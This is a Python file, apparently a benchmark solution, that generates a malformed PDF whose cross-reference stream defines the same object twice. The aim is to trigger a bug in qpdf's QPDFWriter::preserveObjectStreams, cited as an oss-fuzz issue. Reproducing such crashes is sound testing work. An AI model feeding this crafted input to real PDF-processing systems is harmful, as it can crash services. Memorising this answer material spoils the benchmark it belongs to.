import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability in QPDFWriter::preserveObjectStreams (oss-fuzz:42535152) 
        # involves improper handling of multiple entries for the same object ID 
        # in the object cache, specifically when object streams are involved.
        # To trigger this, we construct a PDF with an XRef stream that defines 
        # the same object ID twice: once as a regular object (Type 1) and once 
        # as a compressed object (Type 2) within an object stream.

        def create_obj(num, content):
            return f"{num} 0 obj\n".encode() + content + b"\nendobj\n"
        
        # PDF Header (1.5 required for XRef streams)
        header = b"%PDF-1.5\n%\x80\x81\x82\x83\n"
        
        # Object 1: Catalog
        obj1 = create_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # Object 2: Pages
        obj2 = create_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # Object 3: Page
        obj3 = create_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>")
        
        # Object 4: Defined as a regular (uncompressed) object
        # This is the first definition of Object 4.
        obj4 = create_obj(4, b"(Regular Object 4)")
        
        # Object 5: Defined as an Object Stream containing Object 4 (compressed)
        # This provides the context for the second definition of Object 4.
        # Stream content format: "obj_num offset ... data"
        # "4 0" indicates object 4 is at offset 0 inside the stream.
        stm_pair = b"4 0 "
        stm_data = b"(Compressed Object 4)"
        stm_content = stm_pair + stm_data
        
        obj5_dict = (
            b"<< /Type /ObjStm /N 1 /First " + str(len(stm_pair)).encode() + 
            b" /Length " + str(len(stm_content)).encode() + b" >>"
        )
        obj5 = f"5 0 obj\n".encode() + obj5_dict + b"\nstream\n" + stm_content + b"\nendstream\nendobj\n"
        
        # Build initial body to calculate offsets
        body = header + obj1 + obj2 + obj3 + obj4 + obj5
        
        off1 = body.find(b"1 0 obj")
        off2 = body.find(b"2 0 obj")
        off3 = body.find(b"3 0 obj")
        off4 = body.find(b"4 0 obj")
        off5 = body.find(b"5 0 obj")
        off6 = len(body) # Location of XRef stream object (Object 6)
        
        # Construct XRef Stream data
        # We use W [1 4 2]: 1 byte type, 4 bytes field2 (offset/objnum), 2 bytes field3 (gen/index)
        def pack_entry(t, f2, f3):
            return struct.pack(">B I H", t, f2, f3)
        
        xref_data = b""
        # Range 1: Objects 0 to 6
        # 0: Free
        xref_data += pack_entry(0, 0, 65535)
        # 1: Catalog
        xref_data += pack_entry(1, off1, 0)
        # 2: Pages
        xref_data += pack_entry(1, off2, 0)
        # 3: Page
        xref_data += pack_entry(1, off3, 0)
        # 4: Object 4 (Type 1 definition - Uncompressed)
        xref_data += pack_entry(1, off4, 0)
        # 5: ObjStm
        xref_data += pack_entry(1, off5, 0)
        # 6: XRef Stream itself
        xref_data += pack_entry(1, off6, 0)
        
        # Range 2: Object 4 again (Duplicate)
        # 4: Object 4 (Type 2 definition - Compressed in Obj 5)
        # This duplication for ID 4 aims to trigger the cache invalidation bug.
        xref_data += pack_entry(2, 5, 0)
        
        # Object 6: XRef Stream Object
        # /Index [0 7 4 1] defines two ranges:
        #   1. Start at 0, count 7 (Objects 0, 1, 2, 3, 4, 5, 6)
        #   2. Start at 4, count 1 (Object 4 again)
        obj6_dict = (
            b"<< /Type /XRef /Size 7 /Root 1 0 R /W [1 4 2] "
            b"/Index [0 7 4 1] "
            b"/Length " + str(len(xref_data)).encode() + b" >>"
        )
        obj6 = f"6 0 obj\n".encode() + obj6_dict + b"\nstream\n" + xref_data + b"\nendstream\nendobj\n"
        
        # Trailer (startxref)
        trailer = b"startxref\n" + str(off6).encode() + b"\n%%EOF"
        
        return body + obj6 + trailer